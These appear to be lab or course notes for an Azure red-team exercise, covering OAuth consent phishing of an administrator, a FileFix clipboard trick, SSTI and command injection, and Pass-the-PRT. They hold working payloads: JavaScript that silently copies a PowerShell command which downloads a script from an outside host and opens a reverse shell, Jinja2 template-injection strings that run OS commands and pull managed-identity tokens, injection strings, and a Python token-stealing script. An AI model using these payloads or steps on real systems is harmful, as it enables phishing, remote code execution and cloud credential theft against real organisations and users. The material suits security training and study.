Phase 3: Initial Access Attacks & Tokens

Initial Access - Illicit Consent Grant (OAuth Abuse)

The Illicit Consent Grant attack, often referred to as consent phishing, is a sophisticated identity technique that represents a fundamental shift in how adversaries gain access to cloud environments. Unlike traditional credential theft where an attacker seeks to steal a password to become the user, this attack exploits the authorization model of the cloud itself to manipulate the user into granting permissions to a malicious application.

The danger lies in the fact that the attack occurs entirely within the trusted boundaries of the Microsoft platform, leveraging legitimate features of the OAuth 2.0 protocol rather than exploiting a software vulnerability.

Getting Admin Consent

We engage the Get Admin Consent phase because we have hit the ceiling of what we can achieve with a standard user. Before this phase we effectively possess the digital rights of a regular employee.

The transition to Get Admin Consent involves modifying our application to ask for restricted high-privilege scopes. We add permissions like Mail.Read and Files.ReadWrite which are so dangerous that Microsoft blocks standard users from consenting to them.

Delegated Permissions to request:

  • Files.ReadWrite.All: Access the Administrator's OneDrive and SharePoint
  • Mail.Read: Read the administrator's emails
  • User.ReadWrite.All: Modify user accounts
  • Directory.ReadWrite.All: Modify directory settings

Generate a new link and send it to an Administrator (e.g., Mark Walden).

Once the admin clicks and authorizes, we have their token with high privileges!

FileFix Remote Code Execution

FileFix is a social-engineering technique that tricks users into copying and pasting malicious commands into the File Explorer address bar. It requires no exploits, no admin rights, and no external tools.

The attack flow:

  1. The attacker sets up a phishing page that looks like an internal company file portal.
  2. The page tells the victim to copy a file path and paste it into File Explorer's address bar.
  3. What actually gets copied is a disguised PowerShell command.
  4. When the user pastes and presses Enter, PowerShell runs in the background.

The key is the JavaScript that copies the malicious command instead of the file path:

navigator.clipboard.writeText(`powershell.exe -WindowStyle Hidden -NoLogo -NoProfile -ExecutionPolicy Bypass -Command "iex (New-Object Net.WebClient).DownloadString('http://172.16.1.59:82/Invoke-PowerShellTcp.ps1'); Power -Reverse -IPAddress 172.16.1.59 -Port 4444" # C:\\Defense Corporation\\internal-secure\\filedrive\\SecurityAudit_Report.docx`)

Initial Access - Server Side Template Injection (SSTI)

SSTI occurs when a web application concatenates user input directly into a template file. In Azure, this is effectively a "golden key" vulnerability because it allows us to execute OS commands on the backend container.

Target: https://vaultfrontend.azurewebsites.net/

Identifying the Vulnerability

Test for SSTI by entering template syntax:

{{7*7}}

If it returns 49, the app is vulnerable!

Identify Template Engine

Test different payloads to identify the engine:

{{7*'7'}}

Output shows multiple 7s - this is Python Jinja2!

Get configuration:

{{config.items()}}

From Code Execution to Identity Theft

Execute commands using the template injection:

{{config.__class__.__init__.__globals__['os'].popen('whoami').read()}}

Get environment variables including Managed Identity tokens:

{{config.__class__.__init__.__globals__['os'].popen('env').read()}}

Request access token:

{{config.__class__.__init__.__globals__['os'].popen('curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com" -H secret:$IDENTITY_HEADER').read()}}

Accessing the Vault

Use the token to access resources:

Connect-AzAccount -AccessToken $token -AccountId '2e91a4fe-a0f2-46ee-8214-fa2ff6aa9abc'

Enumerate permissions - discover the app has access to ResearchKeyVault!

This completes the kill chain: web vulnerability → cloud identity compromise → Key Vault access!

Initial Access - OS Command Injection

In Azure PaaS services like App Services, OS Command Injection is effectively a mechanism for Identity Theft. The exploit allows us to communicate with the Azure Instance Metadata Service (IMDS) from within the trusted boundary.

Target: https://virusscanner.azurewebsites.net/

The app has a URL scanner feature that's vulnerable to command injection.

Chaining Commands

  • ; - Execute multiple commands sequentially
  • && - Execute second command only if first succeeds
  • || - Execute second command only if first fails
  • | - Pipe output to second command

Test for injection:

&&id&&

We get uid=1000(app) - we're running as the app service user!

Get environment variables:

Look for IDENTITY_HEADER and IDENTITY_ENDPOINT

Stealing Tokens

Create a Python script to extract tokens:

import os
import json

IDENTITY_ENDPOINT = os.environ['IDENTITY_ENDPOINT']
IDENTITY_HEADER = os.environ['IDENTITY_HEADER']

cmd = 'curl "%s?resource=https://management.azure.com/&api-version=2017-09-01" -H secret:%s' % (IDENTITY_ENDPOINT, IDENTITY_HEADER)
val = os.popen(cmd).read()
print("[+] Management API")
print("Access Token: "+json.loads(val)["access_token"])
print("ClientID: "+json.loads(val)["client_id"])

Upload and execute the script:

http://localhost&&python /tmp/uploads/student59/student59.py&&

We successfully retrieved both ARM (Management API) and Graph API Tokens!

Lateral Movement - Pass-the-PRT & Intune

Primary Refresh Token Extraction

The Primary Refresh Token acts as the persistent digital identity card for a user on a specific device. We target this artifact because retrieving it allows us to impersonate the user from a different location.

Use tools like mimikatz to perform memory scraping on the Local Security Authority Subsystem Service (LSASS).

Pass-the-PRT Attack Mechanics

Inject the decrypted token directly into our browser session or attack tool. This tricks Azure into recognizing our traffic as coming from the victim's verified laptop.

This grants instant authenticated access to the user's applications without knowing their password or needing access to their MFA device.

PRT Renewal and Conditional Access Bypass

The longevity of our access relies on understanding how the Primary Refresh Token can be renewed. As long as the victim device remains active, we can potentially extend our access.
